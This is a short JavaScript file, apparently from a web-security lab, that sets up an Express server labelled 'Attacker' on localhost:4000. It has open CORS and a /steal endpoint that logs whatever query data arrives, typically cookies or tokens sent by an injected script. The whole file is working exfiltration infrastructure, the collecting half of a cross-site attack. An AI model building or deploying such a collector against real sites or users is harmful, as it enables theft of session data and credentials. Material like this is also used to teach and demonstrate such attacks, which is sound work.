import express from "express";
import cors from "cors";

const app = express();
app.use(cors());

app.get("/steal", (req, res) => {
  console.log("[STOLEN]", req.query);
  res.sendStatus(200);
});

app.listen(4000, () => console.log("Attacker on http://localhost:4000"));